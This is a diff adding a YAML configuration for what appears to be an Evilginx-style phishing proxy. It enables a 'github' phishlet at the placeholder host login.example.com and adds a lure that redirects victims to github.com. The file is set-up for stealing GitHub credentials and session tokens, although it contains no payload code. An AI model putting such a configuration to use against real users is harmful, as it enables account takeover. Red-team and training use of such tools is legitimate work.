@@ -1,0 +1,30 @@
+blacklist_mode: 'off'
+ip: ''
+lures:
+- hostname: login.example.com
+  info: ''
+  og_desc: ''
+  og_image: ''
+  og_title: ''
+  og_url: ''
+  path: /
+  phishlet: github
+  redirect_url: https://github.com
+  template: ''
+  ua_filter: ''
+proxy_address: ''
+proxy_enabled: false
+proxy_password: ''
+proxy_port: 0
+proxy_type: ''
+proxy_username: ''
+redirect_key: vq
+redirect_url: ''
+server: example.com
+site_domains:
+  github: login.example.com
+sites_enabled:
+- github
+sites_hidden: []
+verification_key: vx
+verification_token: HJK4
